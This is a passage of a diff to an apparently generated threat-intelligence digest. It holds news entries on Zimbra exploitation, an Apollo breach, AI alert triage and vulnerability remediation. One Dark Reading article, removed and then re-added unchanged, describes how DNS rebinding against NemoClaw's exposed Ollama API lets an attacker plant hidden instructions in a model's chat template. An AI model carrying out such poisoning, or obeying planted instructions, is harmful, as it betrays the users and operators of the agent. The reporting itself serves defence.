instead of a query? It's important to know when to use AI and when not to. If the answer requires a predictable query with only a variable or two changing each time, don't use an agent. Instead, use an Elastic workflow that runs an Elasticsearch Query Language (ES|QL) query, a Kibana API call, or a GET request. They're faster and cheaper, and we keep them modular and reusable across many different orchestrators, so a UserDetailsLookup or PastCasesByRulenameLookup can be called from any workflow that needs it. Agents are more suited for tasks that require reading and reasoning that cannot be completed with a simple query; for example, analyzing past case comments for patterns. We named our workflows to reflect the three types of activities in the main orchestrator: Lookup: ES|QL queries, Kibana API calls, and GET requests
 ```
 
 #### Corroborating sources (1)
 
-- **Sophos X-Ops** (detection_response_operations)
-  - Title: Fake AI, real malware: Attackers impersonating AI brands
-  - Published: 2026-08-19T00:00:00+00:00
-  - Link: https://www.sophos.com/en-us/blog/fake-ai-real-malware-attackers-impersonating-ai-brands
-  - Summary: <p>A year of MDR casework shows attackers repeatedly exploiting demand for AI tools</p> Categories: Threat Research Tags: AI, malvertising, infostealer, Sophos X-Ops
+- **Elastic Security Labs** (detection_response_operations)
+  - Title: Inside Elastic's agentic SOC: How we took AI alert triage from 60% to 92% accuracy
+  - Published: 2026-08-25T00:00:00+00:00
+  - Link: https://www.elastic.co/security-labs/alert-triage-agentic-soc-self-correcting-agents
+  - Summary: Elastic's InfoSec team runs three agents that read the detection rule's investigation guide and the closure reasons on 30 days of past cases. Analysts now clear most alerts with a single click in Slack.
 
 ### Cluster 2854d82035 — score 8
 
@@ -2830,6 +2735,57 @@ Home Blog Post-DEF CON Phishing Uses Google Doc Apps Script to Deliver Malware P
   - Link: https://www.huntress.com/blog/defcon-phishing-google-doc-malware
   - Summary: Huntress researcher uncovers post-Black Hat & DEF CON phishing campaign using X DMs & malicious documents to deliver AMOS, NetSupport RAT, and other malware.
 
+### Cluster f99925d57d — score 8
+
+- Title: Hackers breached over 270 Zimbra servers in ongoing attacks
+- Source: BleepingComputer (cyber_news_breach_reporting)
+- Published: 2026-08-25T12:04:02+00:00
+- Link: https://www.bleepingcomputer.com/news/security/hackers-breached-over-270-zimbra-servers-in-ongoing-attacks/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, apt_espionage
+- actor_attribution: APT28, APT29
+- affected_industries: government
+- affected_products: Ivanti
+- cve_ids: CVE-2026-73570
+- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: apt_espionage, active_exploitation
+- actor_attribution: APT28, APT29
+- affected_industries: government
+- affected_products: Ivanti
+- cve_ids: CVE-2026-73570
+- urgency_signals: actively_exploited, preauth_unauth, no_patch_yet
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Threat actors have already compromised over 270 Zimbra instances in remote code execution attacks targeting a high-severity Zimbra Collaboration Suite (ZCS) vulnerability. [...]
+```
+
+#### Full body
+
+```
+Hackers breached over 270 Zimbra servers in ongoing attacks By Sergiu Gatlan August 25, 2026 08:04 AM 0 Threat actors have already compromised over 270 Zimbra instances in remote code execution attacks targeting a high-severity Zimbra Collaboration Suite (ZCS) vulnerability. The ZCS email and collaboration suite is used by hundreds of millions of people and organizations, including thousands of businesses and hundreds of government agencies worldwide. Synacor patched the security flaw (tracked as CVE-2026-73570 ), which allows unauthenticated attackers to gain code execution remotely by exploiting a command injection weakness in the SNMP monitoring component when SNMP notifications are enabled, with the release of ZCS version 10.1.20 on July 20. CERT Polska, the Polish Computer Emergency Response Team (CERT), first flagged the vulnerability as targeted in the wild last Monday, when it also warned security teams to check their logs for suspicious activity, including the Zimbra service restarting unexpectedly, and for files created in the /opt/zimbra/jetty/webapps/, /opt/zimbra/jetty_base/webapps/, and /tmp/ folders by user zimbra over the last 30 days. The Cybersecurity and Infrastructure Security Agency (CISA) also added the flaw to its KEV catalog following CERT Polska's warning and ordered U.S. Federal Civilian Executive Branch (FCEB) agencies to patch their systems within three days, by August 24. On Monday, threat security watchdog Shadowserver reported that it spotted hundreds of Internet-exposed Zimbra instances that have already been breached in attacks exploiting the CVE-2026-73570 flaw. Map of compromised Zimbra instances (Shadowserver) "Zimbra compromises associated with CVE-2026-73570 exploitation are spreading. 274 instances seen compromised in our scans for exploitation artifacts on 2026-08-22," Shadowserver warned . "We also see at least 8200 CVE-2026-73570 unpatched instances (this does not mean exploitable as the vuln is in a non default config)." Zimbra vulnerabilities are often targeted by cybercriminals and state-sponsored hacking groups, and have been frequently exploited to steal emails containing sensitive data from vulnerable servers in recent years. Most recently, in March, Seqrite Labs researchers spotted APT28 Russian military intelligence hackers abusing a stored cross-site scripting (XSS) Zimbra vulnerability to breach Ukrainian government servers . U.S. and UK cyber agencies also warned in October 2024 that Russian Foreign Intelligence Service hackers (tracked as APT29, Midnight Blizzard, and Cozy Bear) compromised Zimbra servers using a ZCS flaw previously exploited to steal email account credentials . Russian Winter Vivern cyber spies also exploited a reflected Cross-Site Scripting (XSS) vulnerability to steal emails from NATO-aligned email accounts in attacks targeting Zimbra webmail portals. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: CISA orders urgent patching of actively exploited Zimbra flaw Critical Zimbra RCE flaw now actively exploited in attacks One threat actor responsible for 83% of recent Ivanti RCE attacks Microsoft patches max severity code execution, privilege escalation flaws Critical RCE flaw in Windows IKE Extension now actively exploited
+```
+
+#### Corroborating sources (1)
+
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: Hackers breached over 270 Zimbra servers in ongoing attacks
+  - Published: 2026-08-25T12:04:02+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/hackers-breached-over-270-zimbra-servers-in-ongoing-attacks/
+  - Summary: Threat actors have already compromised over 270 Zimbra instances in remote code execution attacks targeting a high-severity Zimbra Collaboration Suite (ZCS) vulnerability. [...]
+
 ### Cluster a9dbfa05a2 — score 8
 
 - Title: Apollo discloses data breach from ongoing wave of attacks hitting financial sector
@@ -2872,88 +2828,6 @@ Advertisement Get our latest cybersecurity news first on Google. Click here! Clo
   - Published: 2026-08-21T19:14:28+00:00
   - Link: https://cyberscoop.com/apollo-discloses-data-breach-social-engineering-attack/
   - Summary: The private equity firm said attackers broke into some of its cloud platforms during a five-day period in early July, compromising sensitive personal data. The post Apollo discloses data breach from ongoing wave of attacks hitting financial sector appeared first on CyberScoop .
-
-### Cluster bbbe9a2892 — score 8
-
-- Title: Finding Nemo(Claw): Networking Issue Allows for LLM Poisoning in OpenClaw
-- Source: Dark Reading (cyber_news_breach_reporting)
-- Published: 2026-08-25T19:50:16+00:00
-- Link: https://www.darkreading.com/cyber-risk/nemo-claw-networking-llm-poisoning-openclaw
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- urgency_signals: preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- urgency_signals: preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Attackers can exploit a security bug in NVIDIA's tool to gain unauthenticated access to the local model server through the Ollama API, paving the way for persistent AI agent corruption.
-```
-
-#### Full body
-
-```
-Cyber Risk Cyberattacks & Data Breaches Threat Intelligence Vulnerabilities & Threats News Finding Nemo(Claw): Networking Issue Allows for LLM Poisoning in OpenClaw Attackers can exploit a security bug in NVIDIA's tool to gain unauthenticated access to the local model server through the Ollama API, paving the way for persistent AI agent corruption. Elizabeth Montalbano , Contributing Writer August 25, 2026 5 Min Read Source: Koshiro K via Shutterstock A vulnerability in NVIDIA's tool for deploying secure AI agents using OpenClaw could allow a cyberattacker to silently poison a large language model's (LLM's) chat template and corrupt the AI agents that are using it. Researchers from Cyera's Oasis Identity Research discovered the network configuration issue in NVIDIA NemoClaw , and, more specifically, its Ollama API, according to a report published today. The issue can expose the API to browser-based attacks that can allow attackers to persistently poison a model from which an AI agent receives instructions, according to the research. NemoClaw is a tool used to deploy the open source OpenClaw AI agent framework inside NVIDIA OpenShell sandboxes, while Ollama is a popular open source runtime for running LLMs on local hardware. In NemoClaw, the API provides the tool with local model inference through an HTTP API on port 11434. The issue that researchers found is that NemoClaw’s configuration of Ollama introduces a network exposure that can allow an attacker , through a malicious Web page and DNS rebinding , to gain unauthenticated control of the local model server. DNS rebinding is a well-known browser-based technique for reaching local services from remote Web pages. Related: Hidden Prompts Trick AI Into False Email Summaries "In short: a single visit to an attacker-controlled Web page is enough to hand the attacker full, unauthenticated control over the local model server that powers the agent," according to the report. "From there, the attacker can silently plant hidden instructions inside the model itself, which the agent then obeys in every subsequent conversation." Oasis Identity Research responsibly disclosed the flaw to NVIDIA through its Product Security Incident Response Team (PSIRT). NVIDIA did not immediately respond to request for comment from Dark Reading, but a CVE tracking number is currently pending. Oasis confirmed to Dark Reading that the bug is fixed for MacOS and Linux (v0.0.35); but there's no fix for Windows. However, v0.0.34 includes a Windows installation with a warning. Setting Up an NemoClaw Attack & Exploitation The flaw itself and how it's exploited aren't necessarily new — an exposed service, an unauthenticated API, and DNS rebinding are all common networking issues, experts say. However, "pointing it at an unauthenticated local model server is the new part, and it's a good preview of where agentic AI risk actually lives," observes Randolph Barr, chief information security officer (CISO) at API security and bot management provider Cequence Security, via email. Related: Calling on Cyber Pros to Help Defend City Hall The opportunity to exploit begins with how NemoClaw configures Ollama. Because OpenShell runs in a container, NemoClaw starts Ollama on 0.0.0.0:11434 rather than restricting it to 127.0.0.1, making the unauthenticated API reachable beyond the host's loopback interface, according to the researchers. That configuration also disables an Ollama Host-header check designed to prevent browser-based access. An attacker can exploit this issue through DNS rebinding , the researchers demonstrated in their proof of concept. A malicious Web page initially loads from an attacker-controlled domain, which is then made to resolve to the victim's local machine. Because the browser still considers the requests to come from the attacker's domain, the page can interact directly with the local Ollama API without authentication, according to the report. From here, the attacker can then enumerate models, run infer
-```
-
-#### Corroborating sources (1)
-
-- **Dark Reading** (cyber_news_breach_reporting)
-  - Title: Finding Nemo(Claw): Networking Issue Allows for LLM Poisoning in OpenClaw
-  - Published: 2026-08-25T19:50:16+00:00
-  - Link: https://www.darkreading.com/cyber-risk/nemo-claw-networking-llm-poisoning-openclaw
-  - Summary: Attackers can exploit a security bug in NVIDIA's tool to gain unauthenticated access to the local model server through the Ollama API, paving the way for persistent AI agent corruption.
-
-### Cluster f0848ac964 — score 8
-
-- Title: The Vulnerability Gap: Why Discovery Is Outrunning Repair
-- Source: Dark Reading (cyber_news_breach_reporting)
-- Published: 2026-08-24T14:00:00+00:00
-- Link: https://www.darkreading.com/cybersecurity-operations/vulnerability-gap-why-discovery-is-outrunning-repair
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: data_breach
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: data_breach
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-AI is discovering more vulnerabilities, faster, and under a tightening regulatory environment, making this an all-hands-on-deck moment for the cybersecurity community.
-```
-
-#### Full body
-
-```
-Cybersecurity Operations Cybersecurity Analytics Vulnerabilities & Threats Commentary The Vulnerability Gap: Why Discovery Is Outrunning Repair AI is discovering more vulnerabilities, faster, and under a tightening regulatory environment, making this an all-hands-on-deck moment for the cybersecurity community. Christopher Robinson , Chief Security Architect, Open Source Security Foundation August 24, 2026 4 Min Read Source: DNY59 via Getty Images COMMENTARY For decades, finding a serious vulnerability in widely used open source software was specialized work. It took a skilled researcher weeks, sometimes months, to trace a flaw and responsibly bring it to a maintainer. That timeline has effectively collapsed. Advanced AI models can now produce vulnerability reports in hours, demolishing what a seasoned professional would have taken weeks to develop. That's not hypothetical: it's what the open source security community has watched happen since the fall of last year, as tools built on frontier models and strong open-weight models alike started turning out findings that are, frankly, good. The trouble is that discovery was never the bottleneck. Fixing was. Patching, disclosure coordination, the upstream maintainer who has to understand a report, validate it, and ship a release — none of that has sped up at anywhere near the same rate. Some projects are using AI to combat the problem, like Valkey's provenance guard or AIxCC winner Trail of Bits' Buttercup finding vulns at DEF CON 2025. Related: Is Cyber Facing an Affordability Crisis? Discovery in Hours, Remediation in Weeks However, the structural mismatch remains: discovery measured in hours, remediation still measured in weeks and months. IBM's Cost of a Data Breach Report 2026 puts a number on that gap. One in four malicious breaches last year were AI-enabled, up 56% over the prior year, and those breaches cost companies $6 million on average, roughly a million more than the overall breach average. The same research found only 18% of organizations are applying AI agents to vulnerability management, even as more than half already use agents for threat detection. Models are finding problems at maximum velocity while the humans supporting these projects are still sitting in the parking lot. Adversaries already have comparably capable agents on their team, too, because the evidence says so. Open-weight models have closed much of the gap with the most expensive frontier systems, which is generally good for defenders: Openness lets you understand how a model was trained and steer it deliberately rather than trust a black box. However, that same openness lowers the floor for attackers, too. This is a current reality. So, what needs to change? Remediation and Prioritization Remediation and prioritization have to become an engineering discipline. When the tens of thousands of lines of AI-discovered findings arrive in droves, treating each as an emergency is a recipe for burnout and bad triage. Projects need prearranged criteria for severity and exploitability, and reports need to reach maintainers validated and documented, not as a raw data dump that overwhelms a human reviewer. Related: Money and Mindset: The Two Biggest Roadblocks to Cyber Policing Right now, a lot of that validation and routing work simply has no home: Multiple organizations independently scan the same obscure library, then each file separately without coordinating, multiplying the load on a maintainer who, on top of all of this, may be working on the project in their spare time. That's the coordination gap efforts like Project Akrites are starting to fill, verifying findings, arming maintainers with context, and synchronizing disclosure, so a fix reaches everyone who depends on a package at the same moment it goes public. It's one piece of a larger response the ecosystem needs and will only work alongside longer-running efforts to create best practices, financially support maintainers, and elevate secure-by-design w
-```
-
-#### Corroborating sources (1)
-
-- **Dark Reading** (cyber_news_breach_reporting)
-  - Title: The Vulnerability Gap: Why Discovery Is Outrunning Repair
-  - Published: 2026-08-24T14:00:00+00:00
-  - Link: https://www.darkreading.com/cybersecurity-operations/vulnerability-gap-why-discovery-is-outrunning-repair
-  - Summary: AI is discovering more vulnerabilities, faster, and under a tightening regulatory environment, making this an all-hands-on-deck moment for the cybersecurity community.
 
 ### Cluster 548cb67a79 — score 8
 
@@ -3040,6 +2914,88 @@ Help Net Security August 25, 2026 Share The cybercrime supply chain has five sta
   - Published: 2026-08-25T05:00:15+00:00
   - Link: https://www.helpnetsecurity.com/2026/08/25/cybercrime-supply-chain-video/
   - Summary: In this Help Net Security video, Chris Nyhuis, CEO at Vigilant, explains why the picture of a lone ransomware attacker is about 15 years out of date. He walks through the cybercrime supply chain and the five businesses inside it: harvesters who run infostealer malware, brokers who verify and resell access, ransomware-as-a-service operators who build the toolkit, affiliates who run the intrusion, and launderers who move the proceeds. Nyhuis covers what each stage costs, from … More → The post The cybercrime supply chain has five stages, each with a price appeared first on Help Net Security .
+
+### Cluster bbbe9a2892 — score 8
+
+- Title: Finding Nemo(Claw): Networking Issue Allows for LLM Poisoning in OpenClaw
+- Source: Dark Reading (cyber_news_breach_reporting)
+- Published: 2026-08-25T19:50:16+00:00
+- Link: https://www.darkreading.com/cyber-risk/nemo-claw-networking-llm-poisoning-openclaw
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- urgency_signals: preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- urgency_signals: preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Attackers can exploit a security bug in NVIDIA's tool to gain unauthenticated access to the local model server through the Ollama API, paving the way for persistent AI agent corruption.
+```
+
+#### Full body
+
+```
+Cyber Risk Cyberattacks & Data Breaches Threat Intelligence Vulnerabilities & Threats News Finding Nemo(Claw): Networking Issue Allows for LLM Poisoning in OpenClaw Attackers can exploit a security bug in NVIDIA's tool to gain unauthenticated access to the local model server through the Ollama API, paving the way for persistent AI agent corruption. Elizabeth Montalbano , Contributing Writer August 25, 2026 5 Min Read Source: Koshiro K via Shutterstock A vulnerability in NVIDIA's tool for deploying secure AI agents using OpenClaw could allow a cyberattacker to silently poison a large language model's (LLM's) chat template and corrupt the AI agents that are using it. Researchers from Cyera's Oasis Identity Research discovered the network configuration issue in NVIDIA NemoClaw , and, more specifically, its Ollama API, according to a report published today. The issue can expose the API to browser-based attacks that can allow attackers to persistently poison a model from which an AI agent receives instructions, according to the research. NemoClaw is a tool used to deploy the open source OpenClaw AI agent framework inside NVIDIA OpenShell sandboxes, while Ollama is a popular open source runtime for running LLMs on local hardware. In NemoClaw, the API provides the tool with local model inference through an HTTP API on port 11434. The issue that researchers found is that NemoClaw’s configuration of Ollama introduces a network exposure that can allow an attacker , through a malicious Web page and DNS rebinding , to gain unauthenticated control of the local model server. DNS rebinding is a well-known browser-based technique for reaching local services from remote Web pages. Related: Hidden Prompts Trick AI Into False Email Summaries "In short: a single visit to an attacker-controlled Web page is enough to hand the attacker full, unauthenticated control over the local model server that powers the agent," according to the report. "From there, the attacker can silently plant hidden instructions inside the model itself, which the agent then obeys in every subsequent conversation." Oasis Identity Research responsibly disclosed the flaw to NVIDIA through its Product Security Incident Response Team (PSIRT). NVIDIA did not immediately respond to request for comment from Dark Reading, but a CVE tracking number is currently pending. Oasis confirmed to Dark Reading that the bug is fixed for MacOS and Linux (v0.0.35); but there's no fix for Windows. However, v0.0.34 includes a Windows installation with a warning. Setting Up an NemoClaw Attack & Exploitation The flaw itself and how it's exploited aren't necessarily new — an exposed service, an unauthenticated API, and DNS rebinding are all common networking issues, experts say. However, "pointing it at an unauthenticated local model server is the new part, and it's a good preview of where agentic AI risk actually lives," observes Randolph Barr, chief information security officer (CISO) at API security and bot management provider Cequence Security, via email. Related: Calling on Cyber Pros to Help Defend City Hall The opportunity to exploit begins with how NemoClaw configures Ollama. Because OpenShell runs in a container, NemoClaw starts Ollama on 0.0.0.0:11434 rather than restricting it to 127.0.0.1, making the unauthenticated API reachable beyond the host's loopback interface, according to the researchers. That configuration also disables an Ollama Host-header check designed to prevent browser-based access. An attacker can exploit this issue through DNS rebinding , the researchers demonstrated in their proof of concept. A malicious Web page initially loads from an attacker-controlled domain, which is then made to resolve to the victim's local machine. Because the browser still considers the requests to come from the attacker's domain, the page can interact directly with the local Ollama API without authentication, according to the report. From here, the attacker can then enumerate models, run infer
+```
+
+#### Corroborating sources (1)
+
+- **Dark Reading** (cyber_news_breach_reporting)
+  - Title: Finding Nemo(Claw): Networking Issue Allows for LLM Poisoning in OpenClaw
+  - Published: 2026-08-25T19:50:16+00:00
+  - Link: https://www.darkreading.com/cyber-risk/nemo-claw-networking-llm-poisoning-openclaw
+  - Summary: Attackers can exploit a security bug in NVIDIA's tool to gain unauthenticated access to the local model server through the Ollama API, paving the way for persistent AI agent corruption.
+
+### Cluster f0848ac964 — score 8
+
+- Title: The Vulnerability Gap: Why Discovery Is Outrunning Repair
+- Source: Dark Reading (cyber_news_breach_reporting)
+- Published: 2026-08-24T14:00:00+00:00
+- Link: https://www.darkreading.com/cybersecurity-operations/vulnerability-gap-why-discovery-is-outrunning-repair
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: data_breach
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: data_breach
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+AI is discovering more vulnerabilities, faster, and under a tightening regulatory environment, making this an all-hands-on-deck moment for the cybersecurity community.
+```
+
+#### Full body
+
+```
+Cybersecurity Operations Cybersecurity Analytics Vulnerabilities & Threats Commentary The Vulnerability Gap: Why Discovery Is Outrunning Repair AI is discovering more vulnerabilities, faster, and under a tightening regulatory environment, making this an all-hands-on-deck moment for the cybersecurity community. Christopher Robinson , Chief Security Architect, Open Source Security Foundation August 24, 2026 4 Min Read Source: DNY59 via Getty Images COMMENTARY For decades, finding a serious vulnerability in widely used open source software was specialized work. It took a skilled researcher weeks, sometimes months, to trace a flaw and responsibly bring it to a maintainer. That timeline has effectively collapsed. Advanced AI models can now produce vulnerability reports in hours, demolishing what a seasoned professional would have taken weeks to develop. That's not hypothetical: it's what the open source security community has watched happen since the fall of last year, as tools built on frontier models and strong open-weight models alike started turning out findings that are, frankly, good. The trouble is that discovery was never the bottleneck. Fixing was. Patching, disclosure coordination, the upstream maintainer who has to understand a report, validate it, and ship a release — none of that has sped up at anywhere near the same rate. Some projects are using AI to combat the problem, like Valkey's provenance guard or AIxCC winner Trail of Bits' Buttercup finding vulns at DEF CON 2025. Related: Is Cyber Facing an Affordability Crisis? Discovery in Hours, Remediation in Weeks However, the structural mismatch remains: discovery measured in hours, remediation still measured in weeks and months. IBM's Cost of a Data Breach Report 2026 puts a number on that gap. One in four malicious breaches last year were AI-enabled, up 56% over the prior year, and those breaches cost companies $6 million on average, roughly a million more than the overall breach average. The same research found only 18% of organizations are applying AI agents to vulnerability management, even as more than half already use agents for threat detection. Models are finding problems at maximum velocity while the humans supporting these projects are still sitting in the parking lot. Adversaries already have comparably capable agents on their team, too, because the evidence says so. Open-weight models have closed much of the gap with the most expensive frontier systems, which is generally good for defenders: Openness lets you understand how a model was trained and steer it deliberately rather than trust a black box. However, that same openness lowers the floor for attackers, too. This is a current reality. So, what needs to change? Remediation and Prioritization Remediation and prioritization have to become an engineering discipline. When the tens of thousands of lines of AI-discovered findings arrive in droves, treating each as an emergency is a recipe for burnout and bad triage. Projects need prearranged criteria for severity and exploitability, and reports need to reach maintainers validated and documented, not as a raw data dump that overwhelms a human reviewer. Related: Money and Mindset: The Two Biggest Roadblocks to Cyber Policing Right now, a lot of that validation and routing work simply has no home: Multiple organizations independently scan the same obscure library, then each file separately without coordinating, multiplying the load on a maintainer who, on top of all of this, may be working on the project in their spare time. That's the coordination gap efforts like Project Akrites are starting to fill, verifying findings, arming maintainers with context, and synchronizing disclosure, so a fix reaches everyone who depends on a package at the same moment it goes public. It's one piece of a larger response the ecosystem needs and will only work alongside longer-running efforts to create best practices, financially support maintainers, and elevate secure-by-design w
+```
+
+#### Corroborating sources (1)
+
+- **Dark Reading** (cyber_news_breach_reporting)
+  - Title: The Vulnerability Gap: Why Discovery Is Outrunning Repair
+  - Published: 2026-08-24T14:00:00+00:00
+  - Link: https://www.darkreading.com/cybersecurity-operations/vulnerability-gap-why-discovery-is-outrunning-repair
+  - Summary: AI is discovering more vulnerabilities, faster, and under a tightening regulatory environment, making this an all-hands-on-deck moment for the cybersecurity community.
 
 ### Cluster dadc215b5f — score 8
 
